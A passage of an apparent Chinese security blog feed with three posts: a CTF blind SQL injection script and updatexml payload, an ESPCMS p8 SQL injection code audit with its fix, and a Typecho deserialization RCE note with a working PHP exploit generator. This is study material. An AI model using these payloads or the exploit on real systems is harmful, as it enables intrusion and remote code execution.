class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = r&apos;http://ctf5.shiyanbar.com/web/baocuo/index.php&apos;</span><br><span class="line"># 0&apos; or 1 or &apos;kage&apos;=&apos;</span><br><span class="line">True_state = &apos;You are our member, welcome to enter&apos;</span><br><span class="line">model = &quot;1&apos; or %s or &apos;0&quot;</span><br><span class="line">column = &quot;database()&quot;</span><br><span class="line"></span><br><span class="line"># column = database()</span><br><span class="line">def my_length(column):</span><br><span class="line">model_len = &quot;(select length(%s) regexp &apos;^%%d$&apos;)&quot; % column</span><br><span class="line">t = 1</span><br><span class="line">while True:</span><br><span class="line">payload_len = model_len % t</span><br><span class="line">payload = model % payload_len</span><br><span class="line">print(payload)</span><br><span class="line">data = &#123;&apos;username&apos;:&apos;admin&apos;,&apos;password&apos;:payload&#125;</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">if True_state in html:</span><br><span class="line">print(&quot;[+]length(%s): %d&quot; % (column,t))</span><br><span class="line">return t</span><br><span class="line">t += 1</span><br><span class="line"></span><br><span class="line"># column = database()</span><br><span class="line">def my_data(column,len):</span><br><span class="line">model_data = &quot;(select %s regexp &apos;%%s$&apos;)&quot; % column</span><br><span class="line">cset = string.digits+string.ascii_lowercase+&apos;!_&#123;&#125;@~.&apos;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(len):</span><br><span class="line">for c in cset:</span><br><span class="line">payload_data = model_data % (c + result)</span><br><span class="line">payload = model % payload_data</span><br><span class="line">data = &#123;&apos;username&apos;:&apos;admin&apos;,&apos;password&apos;:payload&#125;</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">if True_state in html:</span><br><span class="line">result = c + result</span><br><span class="line">print(result)</span><br><span class="line">break</span><br><span class="line">pass</span><br><span class="line">print(&quot;[+]column: %s&quot; % result)</span><br><span class="line"></span><br><span class="line">def get_data(column):</span><br><span class="line">return my_data(column,my_length(column))</span><br><span class="line"></span><br><span class="line"># get_data(&quot;database()&quot;)</span><br><span class="line"># get_data(&quot;(select group_concat(table_name separator &apos;@&apos;) from information_schema.tables where table_schema regexp database())&quot;)</span><br><span class="line">get_data(&quot;(select group_concat(column_name separator &apos;@&apos;) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;)&quot;)</span><br><span class="line"># get_data(&quot;database()&quot;)</span><br></pre></td></tr></table></figure></p><h3 id="（2）报错解题"><a href="#（2）报错解题" class="headerlink" title="（2）报错解题"></a>（2）报错解题</h3><p>因为题目会报错，但是waf过滤了<code>=</code>,<code>rand</code>,<code>floor</code>，所以无法通过<code>substr</code>报错<br>那么我们可以通过xpath报错<br>通过fuzz可以知道username对括号进行过滤，但是没对函数过滤，而password则相反，可以配合<code>/**/</code>进行报错注入</p><p>payload：<code>username=1&#39; and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) and &#39;1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!is_numeric($_REQUEST[&apos;number&apos;])</span><br><span class="line">$req[&apos;number&apos;]==strval(intval($req[&apos;number&apos;])</span><br><span class="line">!is_palindrome_number($req[&quot;number&quot;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$value1==$value2</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-简单登录题&quot;&gt;&lt;a href=&quot;#1-简单登录题&quot; class=&quot;headerlink&quot; title=&quot;1. 简单登录题&quot;&gt;&lt;/a&gt;1. 简单登录题&lt;/h2&gt;&lt;p&gt;考点：CBC翻转字节攻击+sql注入&lt;br&gt;从返回包得到tip：test.php&lt;br&gt;访问得到
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>ESPCMS p8前台SQL注入</title>
    <link href="http://yoursite.com/2019/09/04/ESPCMS%20p8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/09/04/ESPCMS p8前台SQL注入/</id>
    <published>2019-09-04T15:54:01.000Z</published>
    <updated>2019-09-04T15:54:01.161Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://gitee.com/earclink/espcms" target="_blank" rel="noopener">https://gitee.com/earclink/espcms</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在espcms_web\Search.php中<br>第52行，Search类对用户GET方式提交的<code>attr_array</code>数据，直接进行反序列化<br>然后对反序列化的数据进行是否为数组的判断，得到<code>attr_array</code>数组<br>然后对<code>attr_array</code>数组的键值对进行遍历，在<code>db_att_where</code>字符串中直接拼接<code>key</code>的值<br>将表名和<code>db_att_where</code>传入<code>espcms_db_num</code>函数进行处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&apos;attr_array&apos;]) &#123;</span><br><span class="line">$_REQUEST[&apos;attr_array&apos;] = unserialize(stripslashes($_GET[&apos;attr_array&apos;]));</span><br><span class="line">&#125;</span><br><span class="line">$attr_array = $_REQUEST[&apos;attr_array&apos;] &amp;&amp; is_array($_REQUEST[&apos;attr_array&apos;]) ? $_REQUEST[&apos;attr_array&apos;] : array();</span><br><span class="line">if (is_array($attr_array) &amp;&amp; count($attr_array) &gt; 0) &#123;</span><br><span class="line">foreach ($attr_array as $key =&gt; $value) &#123;</span><br><span class="line">if ($value) &#123;</span><br><span class="line">$db_att_where = &quot; AND isclass=1 AND attrname=&apos;$key&apos;&quot;;</span><br><span class="line">$countnum = espcms_db_num($db_table_model_att, $db_att_where);</span><br><span class="line">if ($countnum &gt; 0) &#123;</span><br><span class="line">if (is_array($value) &amp;&amp; count($value) &gt; 0) &#123;</span><br><span class="line">$db_where_or = &apos;&apos;;</span><br><span class="line">foreach ($value as $i =&gt; $where_val) &#123;</span><br><span class="line">$where_val = check_str($where_val);</span><br><span class="line">$db_where_or .= $i &gt; 0 ? &quot; OR FIND_IN_SET(&apos;$where_val&apos;,b.$key)&quot; : &quot; FIND_IN_SET(&apos;$where_val&apos;,b.$key)&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$db_where .= &quot; AND ($db_where_or)&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$value = check_str($value);</span><br><span class="line">$db_where .= &quot; AND b.$key=&apos;$value&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>在espcms_public\espcoms_db.php中<br>第221行，将<code>$db_where</code>字段与<code>&#39; WHERE 1=1&#39;</code>字符串进行拼接<br>在将where字段拼接到select字段中，传入<code>db_array_read</code>函数进行处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function espcms_db_num($tableName, $db_where = null, $num_str = &apos;*&apos;) &#123;</span><br><span class="line">global $espcms_link_db;</span><br><span class="line">if (!$tableName) &#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">$sql_where = &quot; WHERE 1=1&quot; . $db_where;</span><br><span class="line">$db_sql = &quot;SELECT COUNT($num_str) AS num FROM $tableName $sql_where&quot;;</span><br><span class="line">$db_read = $espcms_link_db-&gt;db_array_read($db_sql);</span><br><span class="line">return $db_read[&apos;num&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在espcms_public\ESPCMS_Mysql.php中<br>第157行，<code>db_array_read</code>将数据传入第139行<code>db_query</code>执行，一路并没有做任何过滤，因而存在时间盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function db_array_read($sql) &#123;</span><br><span class="line">$query = $this-&gt;db_query($sql);</span><br><span class="line">return $this-&gt;db_array_list($query);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>至此，分析结束</p><h2 id="官方修复方案"><a href="#官方修复方案" class="headerlink" title="官方修复方案"></a>官方修复方案</h2><p>作者在新版本中针对key值进行了过滤。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!espcms_isact($key, &quot;/^[\w]+$/i&quot;)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;下载地址&quot;&gt;&lt;a href=&quot;#下载地址&quot; class=&quot;headerlink&quot; title=&quot;下载地址&quot;&gt;&lt;/a&gt;下载地址&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://gitee.com/earclink/espcms&quot; target=&quot;_blank&quot; re
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>Typecho反序列化小白笔记</title>
    <link href="http://yoursite.com/2019/09/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%99%BD%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/09/01/Typecho反序列化小白笔记/</id>
    <published>2019-09-01T12:02:09.000Z</published>
    <updated>2019-09-01T12:02:09.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>序列化内容：Array（Object）<br>反序列化<br>反序列化内容传入Typecho_Db的构造函数中<br>Typecho_Db构造函数将Object与字符串拼接触发<code>__toString</code>方法<br>搜寻<code>__toString</code>方法<br>在<code>Typecho_Feed</code>类中<code>__toString</code>方法第290行的私有变量调用了某个属性<code>$_items</code><br>该属性被遍历，其元素的<code>$item[&#39;author&#39;]</code>调用了某个属性<code>screenName</code><br>我们可以控制其访问不可访问属性来触发<code>__get</code>方法，因此将Object设置为<code>Typecho_feed</code><br>搜寻<code>__get</code>方法<br>找到<code>Typecho_Request</code>类，分析<code>__get</code>方法，<code>__get</code>方法调用了<code>get</code>方法<br><code>get</code>寻找<code>$_params</code>中键为<code>key</code>的值赋值为<code>value</code>，<code>key</code>值为<code>scrennName</code><br><code>get</code>方法调用<code>_applyFilter</code>方法，将<code>value</code>传递进去<br><code>_applyFilter</code>有危险方法<code>call_user_func</code>，并且两个参数可控，最后达成命令执行。<br>因此将<code>_itmes</code>的元素赋值为<code>Typecho_Request</code>，并且设置<code>default</code>为<code>phpinfo();</code>，设置<code>_filter</code>为<code>array(&#39;assert&#39;)</code></p><h2 id="payload结构："><a href="#payload结构：" class="headerlink" title="payload结构："></a>payload结构：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">(  // 实例化一个Typecho_Db， 数组必须包含 &apos;adapter&apos;和&apos;prefix&apos;两个键值</span><br><span class="line"></span><br><span class="line">    /** </span><br><span class="line">     * 实例化Typecho_Db时构造函数中进行字符串拼接，</span><br><span class="line">     * 如果值为对象，则触发该对象的 __toString()魔术方法</span><br><span class="line">     */</span><br><span class="line">    [adapter] =&gt; Typecho_Feed Object  </span><br><span class="line">      (</span><br><span class="line">        /** </span><br><span class="line">         * 在Feed的__toString()魔术方法中，</span><br><span class="line">         * 290行和358行，访问了$item[&apos;author&apos;]-&gt;screenName</span><br><span class="line">         * 程序要运行到此处$this-&gt;_type必须为 &quot;RSS 2.0&quot;或者&quot;ATOM 1.0&quot;</span><br><span class="line">         */</span><br><span class="line">        [_type:Typecho_Feed:private] =&gt; RSS 2.0  </span><br><span class="line"></span><br><span class="line">        /** </span><br><span class="line">         * 当从不可访问的属性中读取，将会触发该类的__get()魔术方法</span><br><span class="line">         */</span><br><span class="line">        [_items:Typecho_Feed:private] =&gt; Array</span><br><span class="line">          (</span><br><span class="line">            [0] =&gt; Array</span><br><span class="line">              (</span><br><span class="line">                /** </span><br><span class="line">                 * &apos;category&apos; 用于分支处理，如果不用于回显数据，此字段可以省略</span><br><span class="line">                 *  此处需要构造非空数组，且成员值为对象</span><br><span class="line">                 */</span><br><span class="line">                [category] =&gt; Array</span><br><span class="line">                  (</span><br><span class="line">                    [0] =&gt; Test Object</span><br><span class="line">                      (</span><br><span class="line">                      )</span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">                /** </span><br><span class="line">                 *  此处构造满足触发Typecho_Request对象的__get()魔术方法</span><br><span class="line">                 */</span><br><span class="line">                [author] =&gt; Typecho_Request Object</span><br><span class="line">                  (  // 必须包含两个键值 &apos;_params&apos;和&apos;_filter&apos;</span><br><span class="line"></span><br><span class="line">                    /** </span><br><span class="line">                     * @ 此处为触发的关键部分</span><br><span class="line">                     * 1、由Feed类中访问screName触发Request的__get()，</span><br><span class="line">                     *    在Request.php的290行传入$key=&apos;screenName&apos;</span><br><span class="line">                     * 2、此时get()函数内  $value=&apos;phpinfo()&apos;    // 296-297行</span><br><span class="line">                     * 3、继续判断了  $value值非数组，且长度大于0  // 307行</span><br><span class="line">                     * 4、将 $value 传入 _applyFilter()                </span><br><span class="line">                     * 5、判断 $this-&gt;_filter                    // 161行</span><br><span class="line">                     * 6、遍历 $this-&gt;_filter                    // 162行</span><br><span class="line">                     * 7、$value非数组，执行call_user_func($filter, $value)</span><br><span class="line">                     * 8、最终执行结果为call_user_func(assert, phpinfo())</span><br><span class="line">                     */</span><br><span class="line">                    [_params:Typecho_Request:private] =&gt; Array</span><br><span class="line">                      (</span><br><span class="line">                        [screenName] =&gt; phpinfo()</span><br><span class="line">                      )</span><br><span class="line"></span><br><span class="line">                    [_filter:Typecho_Request:private] =&gt; Array</span><br><span class="line">                      (</span><br><span class="line">                        [0] =&gt; assert</span><br><span class="line">                      )</span><br><span class="line">                  )</span><br><span class="line">              )</span><br><span class="line">          )</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">    // 分支处理</span><br><span class="line">    [prefix] =&gt; typecho_</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>没注释的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">    [adapter] =&gt; Typecho_Feed Object</span><br><span class="line">    (</span><br><span class="line">        [_type:Typecho_Feed:private] =&gt; RSS 2.0</span><br><span class="line">        [_items:Typecho_Feed:private] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; Array</span><br><span class="line">            (</span><br><span class="line">                [category] =&gt; Array</span><br><span class="line">                    (</span><br><span class="line">                        [0] =&gt; Test Object</span><br><span class="line">                            (</span><br><span class="line">                            )</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                [author] =&gt; Typecho_Request Object</span><br><span class="line">                (</span><br><span class="line">                    [_params:Typecho_Request:private] =&gt; Array</span><br><span class="line">                        (</span><br><span class="line">                            [screenName] =&gt; phpinfo()</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [_filter:Typecho_Request:private] =&gt; Array</span><br><span class="line">                        (</span><br><span class="line">                            [0] =&gt; assert</span><br><span class="line">                        )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    [prefix] =&gt; typecho_</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$CMD = &apos;phpinfo()&apos;;</span><br><span class="line"></span><br><span class="line">class Typecho_Feed &#123;</span><br><span class="line">const RSS2 = &apos;RSS 2.0&apos;;</span><br><span class="line">const ATOM1 = &apos;ATOM 1.0&apos;;</span><br><span class="line"></span><br><span class="line">private $_type;</span><br><span class="line">private $_items;</span><br><span class="line"></span><br><span class="line">public function __construct() &#123;</span><br><span class="line">//$this-&gt;_type = $this::RSS2;</span><br><span class="line"></span><br><span class="line">$this-&gt;_type = $this::ATOM1;</span><br><span class="line">$this-&gt;_items[0] = array(</span><br><span class="line">&apos;category&apos; =&gt; array(new Typecho_Request()),</span><br><span class="line">&apos;author&apos; =&gt; new Typecho_Request(),</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Request &#123;</span><br><span class="line">private $_params = array();</span><br><span class="line">private $_filter = array();</span><br><span class="line"></span><br><span class="line">public function __construct() &#123;</span><br><span class="line">$this-&gt;_params[&apos;screenName&apos;] = $GLOBALS[CMD];</span><br><span class="line">$this-&gt;_filter[0] = &apos;assert&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = array(</span><br><span class="line">&apos;adapter&apos; =&gt; new Typecho_Feed(),</span><br><span class="line">&apos;prefix&apos; =&gt; &apos;typecho_&apos;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>需要GET传参finish，并且Referer字段为本站。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/155753.html</a></li><li><a href="https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</a></li><li><a href="https://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/#typecho%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">https://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/#typecho%E5%BA%8F%E5%88%97%E5%8C%96</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;序列化内容：Array（Object）&lt;br&gt;反序列化&lt;br&gt;反序列化内容传入Typecho_Db的构造函数中&lt;br&gt;Typecho_Db构
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
</feed>
